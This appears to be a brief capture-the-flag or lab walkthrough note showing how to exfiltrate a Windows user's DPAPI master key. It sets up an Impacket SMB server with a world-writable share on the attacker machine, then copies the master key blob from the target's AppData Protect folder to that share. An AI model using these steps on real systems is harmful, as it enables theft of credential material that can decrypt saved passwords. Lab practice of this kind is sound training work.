
### My machine
```sh
mkdir -p share
chmod 777 share

sudo impacket.smbserver share ./share -smb2support

```

### Target
```powershell
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.94\share\masterkey_blob

```